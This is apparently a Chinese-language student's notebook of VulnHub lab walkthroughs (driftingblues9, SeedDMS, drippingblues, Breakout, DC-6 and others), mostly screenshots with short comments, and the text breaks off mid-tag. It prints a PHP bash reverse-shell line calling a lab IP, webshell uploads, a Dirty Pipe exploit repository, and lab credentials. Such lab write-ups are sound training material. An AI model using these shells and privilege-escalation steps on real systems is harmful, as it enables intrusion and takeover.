@@ -1,0 +1,1590 @@
+<p><strong>driftingblues9</strong></p>
+<p>靶机就开了80和111，80端口有个登录但是我用burp收集到的信息应该可能是web框架</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image1.png"
+style="width:5.76042in;height:3.43556in" alt="截图.png" /></p>
+<p>果然轻轻松松拿到shell</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image2.png"
+style="width:5.76042in;height:2.95471in" alt="截图.png" /></p>
+<p>登录成功直接出密码</p>
+<p>&lt;?php</p>
+<p> // DATABASE CONNECTION INFORMATION</p>
+<p> define('DATABASE_HOST', 'localhost'); // Database host</p>
+<p> define('DATABASE_NAME', 'microblog'); // Name of the database to be
+used</p>
+<p> define('DATABASE_USERNAME', 'clapton'); // User name for access to
+database</p>
+<p> define('DATABASE_PASSWORD', 'yaraklitepe'); // Password for access
+to database</p>
+<p> define('DB_ENCRYPT_KEY', 'p52plaiqb8'); // Database encryption
+key</p>
+<p> define('DB_PREFIX', 'mb101_'); // Unique prefix of all table names
+in the database</p>
+<p> ?&gt;</p>
+<p>nc反弹成功，之前一直没成功，可能是忘记了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image3.png"
+style="width:5.76042in;height:2.41098in" alt="截图.png" /></p>
+<p>python切换</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image4.png"
+style="width:5.76042in;height:2.22541in" alt="截图.png" /></p>
+<p>得到flag</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image5.png"
+style="width:4.29167in;height:1.16667in" alt="截图.png" /></p>
+<p>这个提示应该是和提权有关系</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image6.png"
+style="width:5.76042in;height:1.87363in" alt="截图.png" /></p>
+<p>提权失败感觉这个input文件有点奇怪</p>
+<p><strong>Ubuntu_CTF(SeedDMS)</strong></p>
+<p>只开启80和3306端口</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image7.png"
+style="width:5.76042in;height:1.99837in" alt="截图.png" /></p>
+<p>3306还对爆破做了控制</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image8.png"
+style="width:5.76042in;height:2.39124in" alt="截图.png" /></p>
+<p>只能从80端口找猫腻了</p>
+<p>一没网站框架，二没子目录，三没可疑文件，透露的信息少之又少，所以只能打开burp抓包分析他的网站那些js代码了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image9.png"
+style="width:5.76042in;height:3.71466in" alt="截图.png" /></p>
+<p>找到个子目录访问得到seedDMS网站框架</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image10.png"
+style="width:5.76042in;height:2.81563in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image11.png"
+style="width:5.76042in;height:0.58329in" alt="截图.png" /></p>
+<p>必须登录才能办事，所以我用cewl工具收集了信息进行密码用户爆破但是太多了根本不行</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image12.png"
+style="width:5.76042in;height:4.43393in" alt="截图.png" /></p>
+<p>只能去寻找密码了（无果）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image13.png"
+style="width:5.76042in;height:4.52644in" alt="截图.png" /></p>
+<p>百度说在conf/settings.xml 里面有密码和用户真够狗（信息收集我还是太弱了）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image14.png"
+style="width:5.76042in;height:4.10482in" alt="截图.png" /></p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image15.png"
+style="width:5.76042in;height:1.75478in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image16.png"
+style="width:5.76042in;height:3.57285in" alt="截图.png" /></p>
+<p>登录失败</p>
+<p>查看其他也标有user字样的目录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image17.png"
+style="width:5.76042in;height:1.14848in" alt="截图.png" /></p>
+<p>发现admin的md5值</p>
+<p>换了几个md5解码网站终于解码失败</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image18.png"
+style="width:5.76042in;height:2.60988in" alt="截图.png" /></p>
+<p>修改admin密码然后上传</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image19.png"
+style="width:5.76042in;height:1.85794in" alt="截图.png" /></p>
+<p>kali数据库太麻烦了直接选择 navicat下载图像化的才像样</p>
+<p><a
+href="https://blog.csdn.net/m0_46829545/article/details/130172140">https://blog.csdn.net/m0_46829545/article/details/130172140</a></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image20.png"
+style="width:5.76042in;height:6.27041in" alt="截图.png" /></p>
+<p>特别方便</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image21.png"
+style="width:5.76042in;height:4.36526in" alt="截图.png" /></p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image22.png"
+style="width:5.76042in;height:3.36024in" alt="截图.png" /></p>
+<p>查看版本信息</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image23.png"
+style="width:5.76042in;height:3.16455in" alt="截图.png" /></p>
+<p>版本都太高不能行了</p>
+<p>发现文件上传</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image24.png"
+style="width:5.76042in;height:3.00065in" alt="截图.png" /></p>
+<p>上传成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image25.png"
+style="width:5.76042in;height:3.05697in" alt="截图.png" /></p>
+<p>找不到位置我们就扫</p>
+<p>扫描工具太啦了，又没扫到</p>
+<p>\seeddms51x\data\1048576\(文件序号)\1.php<strong>(你上传的文件会被重命名为
+1.php)，</strong>其中文件序号在后台的文档信息中的序号相对应</p>
+<p>终于成功了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image26.png"
+style="width:5.76042in;height:1.96568in" alt="截图.png" /></p>
+<p>使用weevely生成木马反弹成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image27.png"
+style="width:5.76042in;height:2.52193in" alt="截图.png" /></p>
+<p>权限实在太低</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image28.png"
+style="width:4.06944in;height:0.8014in" alt="截图.png" /></p>
+<p>我们之前得到了saket的密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image29.png"
+style="width:5.76042in;height:1.59898in" alt="截图.png" /></p>
+<p>查看发现他可以bash</p>
+<p>这时候只能从网页上试试权限了，木马反弹的不太行</p>
+<p>这里要在后面加分号才行</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image30.png"
+style="width:5.76042in;height:1.0226in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image31.png"
+style="width:5.76042in;height:1.06403in" alt="截图.png" /></p>
+<p>bash反弹成功</p>
+<p>&lt;?php system("bash -c 'bash -i &gt;&amp;
+/dev/tcp/172.16.123.108/7777 0&gt;&amp;1'");?&gt;</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image32.png"
+style="width:5.76042in;height:2.75163in" alt="截图.png" /></p>
+<p>很明显这个可以了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image33.png"
+style="width:5.76042in;height:0.70199in" alt="截图.png" /></p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image34.png"
+style="width:5.76042in;height:1.26485in" alt="截图.png" /></p>
+<p>sudo su提权成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image35.png"
+style="width:5.76042in;height:1.26485in" alt="截图.png" /></p>
+<p><strong>drippingblues（CVE-2021-4034
+<mark>polkit授权管理器 漏洞</mark>）</strong></p>
+<p>ftp匿名登录发现zip</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image36.png"
+style="width:5.76042in;height:2.69001in" alt="截图.png" /></p>
+<p>john 爆破成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image37.png"
+style="width:5.76042in;height:3.19523in" alt="截图.png" /></p>
+<p>得到提示</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image38.png"
+style="width:5.76042in;height:1.77018in" alt="截图.png" /></p>
+<p>首页发现一点点提示</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image39.png"
+style="width:5.76042in;height:1.26574in" alt="截图.png" /></p>
+<p>robots.txt泄漏</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image40.png"
+style="width:5.76042in;height:4.25914in" alt="截图.png" /></p>
+<p>第一个文件给了个密码破解一样的提示</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image41.png"
+style="width:5.76042in;height:2.20726in" alt="截图.png" /></p>
+<p>第二个提示应该是关于提权的，这么多提示真的是草了</p>
+<p>解析参考发现这个drip是文件包含，可惜没想到发现密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image42.png"
+style="width:2.13889in;height:0.75122in" alt="截图.png" /></p>
+<p>imdrippinbiatch</p>
+<p>再把之前从主页得到的用户名类似的跑一下这个密码登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image43.png"
+style="width:5.48611in;height:4.00788in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image44.png"
+style="width:5.02778in;height:0.56328in" alt="截图.png" /></p>
+<p>提权：脏管道行不通</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image45.png"
+style="width:5.76042in;height:2.16798in" alt="截图.png" /></p>
+<p>CVE-2022-4034</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image46.png"
+style="width:5.76042in;height:1.04069in" alt="截图.png" /></p>
+<p>这里给的两个链接的都不是很好因为靶机没有make,只能运行个python
+或者编译好C和shell</p>
+<p>所以百度看看其他的exp有没有符合我们要求的（找到了但是靶机有问题）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image47.png"
+style="width:5.76042in;height:3.01101in" alt="截图.png" /></p>
+<p>提权失败</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image48.png"
+style="width:5.76042in;height:2.67477in" alt="截图.png" /></p>
+<p>重新导入靶机</p>
+<p>第一次没成功第二次加满权限成功了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image49.png"
+style="width:5.76042in;height:1.44477in" alt="截图.png" /></p>
+<p>破靶机</p>
+<p><strong>Breakout（getcap查看文件功能）</strong></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image50.png"
+style="width:5.76042in;height:2.94911in" alt="截图.png" /></p>
+<p>首先查看smb服务是否有关键信息</p>
+<p>并没有发现</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image51.png"
+style="width:4.19444in;height:1.43988in" alt="截图.png" /></p>
+<p>直接扫80后台</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image52.png"
+style="width:5.76042in;height:3.34447in" alt="截图.png" /></p>
+<p>没发现什么好东西</p>
+<p>在主页查看源码发现信息</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image53.png"
+style="width:5.76042in;height:0.80681in" alt="截图.png" /></p>
+<p>这是密码学里面的一种加密</p>
+<p>解码网页：<a
+href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<p>解码得到.2uqPEfj3D&lt;P'a-3</p>
+<p>接着访问10000和20000发现是两个不一样的登录网页</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image54.png"
+style="width:5.76042in;height:3.85397in" alt="截图.png" /></p>
+<p>所以我们先收集用户名</p>
+<p>enum4linux IP</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image55.png"
+style="width:5.76042in;height:1.02393in" alt="截图.png" /></p>
+<p>收集到cyber用户,然后使用之前的密码登录</p>
+<p>10000登录不行</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image56.png"
+style="width:5.76042in;height:3.06487in" alt="截图.png" /></p>
+<p>20000可以</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image57.png"
+style="width:5.76042in;height:3.07768in" alt="截图.png" /></p>
+<p>找到语言改成中文</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image58.png"
+style="width:5.76042in;height:3.15292in" alt="截图.png" /></p>
+<p>发现终端,使用 bash反弹成功，从它没开22端口我就知道他是要反弹</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image59.png"
+style="width:5.76042in;height:1.6188in" alt="截图.png" /></p>
+<p>查看内核发现可能有脏管道漏洞（CVE-2022-0847）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image60.png"
+style="width:5.76042in;height:1.95854in" alt="截图.png" /></p>
+<p>还是用脚本跑一下看看没发现什么特别漏洞，倒是发现这个目录下有些好东西</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image61.png"
+style="width:5.76042in;height:4.02745in" alt="截图.png" /></p>
+<p>密码备份可惜要root权限</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image62.png"
+style="width:5.76042in;height:1.10097in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image63.png"
+style="width:4.30556in;height:0.76103in" alt="截图.png" /></p>
+<p>查看tar发现是个可执行文件所以使用getcap工具查看：<mark>getcap
+可以获得程序文件所具有的能力 (CAP).</mark></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image64.png"
+style="width:3.86111in;height:0.84527in" alt="截图.png" /></p>
+<p>发现他有读取的功能</p>
+<p>按照他的help提示得到如下</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image65.png"
+style="width:5.76042in;height:1.74667in" alt="截图.png" /></p>
+<p>Ts&amp;4&amp;YurgtRX(=~h 这个就是root密码</p>
+<p>成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image66.png"
+style="width:5.56944in;height:1.16812in" alt="截图.png" /></p>
+<p><strong>matrix-breakout-2-morp（CVE-2022-0847脏管道）</strong></p>
+<p>使用dirb扫描目录根本没东西，百度使用gobuster工具扫终于发现了可疑文件</p>
+<p>gobuster dir -u http://172.16.123.106 -x php,bak,html,txt -w
+/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image67.png"
+style="width:5.76042in;height:3.84028in" alt="截图.png" /></p>
+<p>打开文件发现是一个可以写入的php所以先抓包测试一下。</p>
+<p>发现可以在post改掉它输入的文字最后保存地址</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image68.png"
+style="width:5.76042in;height:1.56096in" alt="截图.png" /></p>
+<p>访问phpinfo.php果然成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image69.png"
+style="width:5.76042in;height:3.6207in" alt="截图.png" /></p>
+<p>写入执行命令木马后，信息收集发现flag1</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image70.png"
+style="width:5.76042in;height:1.08968in" alt="截图.png" /></p>
+<p>提示很重要</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image71.png"
+style="width:5.76042in;height:1.32455in" alt="截图.png" /></p>
+<p>查看passwd文件分析用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image72.png"
+style="width:3.69444in;height:0.77228in" alt="截图.png" /></p>
+<p>可能就是找密码然后登录后提权了。</p>
+<p>按照翻译后的提示找到这个照片</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image73.png"
+style="width:5.76042in;height:3.29098in" alt="截图.png" /></p>
+<p>分析里面有没有密码(无果)</p>
+<p>使用网上的后渗透脚本批量跑发现一个脏牛一样的漏洞可以使用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image74.png"
+style="width:5.76042in;height:4.90893in" alt="截图.png" /></p>
+<p>使用不成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image75.png"
+style="width:4.90278in;height:1.0097in" alt="截图.png" /></p>
+<p>百度搜索漏洞其他的利用方法</p>
+<p>git clone <a
+href="https://github.com/imfiver/CVE-2022-0847.git"><u>https://github.com/imfiver/CVE-2022-0847.git</u></a></p>
+<p>发现和还有脚本，使用看看</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image76.png"
+style="width:5.76042in;height:1.87398in" alt="截图.png" /></p>
+<p>终于提取成功了，</p>
+<p>接着信息收集，发现之前那个81端口是用nginx搭建的所以我们看看nginx是不是有东西</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image77.png"
+style="width:5.76042in;height:2.7943in" alt="截图.png" /></p>
+<p>终于发现密码开始爆破，那个照片居然没什么用真坑。</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image78.png"
+style="width:5.76042in;height:2.10214in" alt="截图.png" /></p>
+<p>半天爆破不出。</p>
+<p><strong>DC-6 （WordPress爆破，Activity monitor插件漏洞）</strong></p>
+<p>信息收集：</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image79.png"
+style="width:5.76042in;height:2.97542in" alt="截图.png" /></p>
+<p>发现有wp-admin说明是wordpress框架</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image80.png"
+style="width:5.76042in;height:6.3476in" alt="截图.png" /></p>
+<p>网页访问是错误的，发现是wordy，说明是要改host，重定向。</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image81.png"
+style="width:5.76042in;height:3.23559in" alt="截图.png" /></p>
+<p>修改hosts</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image82.png"
+style="width:5.76042in;height:3.23559in" alt="截图.png" /></p>
+<p>弱密码行不通</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image83.png"
+style="width:5.76042in;height:4.48552in" alt="截图.png" /></p>
+<p>使用wpscan扫用户名</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image84.png"
+style="width:5.26389in;height:3.45019in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image85.png"
+style="width:5.76042in;height:3.23559in" alt="截图.png" /></p>
+<p>制作用户本</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image86.png"
+style="width:2.13889in;height:1.2103in" alt="截图.png" /></p>
+<p>跑密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image87.png"
+style="width:5.76042in;height:4.85701in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image88.png"
+style="width:5.76042in;height:3.23559in" alt="截图.png" /></p>
+<p>爆破成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image89.png"
+style="width:5.76042in;height:5.70963in" alt="截图.png" /></p>
+<p>使用（wp_admin_shell渗透）并未成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image90.png"
+style="width:5.76042in;height:5.08772in" alt="截图.png" /></p>
+<p>试试看从靶机网页上找Activity monitor插件漏洞</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image91.png"
+style="width:5.76042in;height:3.99352in" alt="截图.png" /></p>
+<p>搜索插件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image92.png"
+style="width:5.76042in;height:1.05531in" alt="截图.png" /></p>
+<p>渗透得shell</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image93.png"
+style="width:5.76042in;height:2.2745in" alt="截图.png" /></p>
+<p>提权信息搜集发现</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image94.png"
+style="width:5.76042in;height:1.86421in" alt="截图.png" /></p>
+<p>发现密码和用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image95.png"
+style="width:4.81944in;height:0.96805in" alt="截图.png" /></p>
+<p>sudo -l 发现graham有 backups.sh的使用权限</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image96.png"
+style="width:5.76042in;height:1.23498in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image97.png"
+style="width:4.81944in;height:1.86727in" alt="截图.png" /></p>
+<p>但是发现不对，百度发现要转换身份</p>
+<p>转换身份：</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image98.png"
+style="width:3.40278in;height:1.47766in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image99.png"
+style="width:5.76042in;height:0.91172in" alt="截图.png" /></p>
+<p>sudo -l 发现namp提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image100.png"
+style="width:5.76042in;height:1.20343in" alt="截图.png" /></p>
+<p>使用普通的根本行不通</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image101.png"
+style="width:4.48611in;height:0.71986in" alt="截图.png" /></p>
+<p>使用msfconsole提权的也行不通，反弹不了，只能使用脚本的方法提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image102.png"
+style="width:5.76042in;height:2.79792in" alt="截图.png" /></p>
+<p>提权成功（一定要sudo在前面）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image103.png"
+style="width:5.76042in;height:0.96007in" alt="截图.png" /></p>
+<p><strong>My_file_server(ssh私钥上传)</strong></p>
+<p>使用nmap扫服务和漏洞发现开启了smb服务像这种靶机不太可能存在系统漏洞所以可以直接放弃</p>
+<p>使用nikto扫80网站发现txt打开就是密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image104.png"
+style="width:5.76042in;height:1.49019in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image105.png"
+style="width:5.76042in;height:1.58591in" alt="截图.png" /></p>
+<p>发现smb服务有guest用户，使用smbclient登录目录查看重要文件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image106.png"
+style="width:4.5in;height:3.45833in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image107.png"
+style="width:5.76042in;height:2.72943in" alt="截图.png" /></p>
+<p>竟然我们得到了密码就说明现在是在找用户名的时候</p>
+<p>现在可疑文件翻看用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image108.png"
+style="width:5.76042in;height:3.43925in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image109.png"
+style="width:5.76042in;height:2.93899in" alt="截图.png" /></p>
+<p>ftp登录后发现是home目录，可以放ssh公钥，登录ssh因为ssh只能使用公钥登录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image110.png"
+style="width:5.76042in;height:3.75952in" alt="截图.png" /></p>
+<p><img
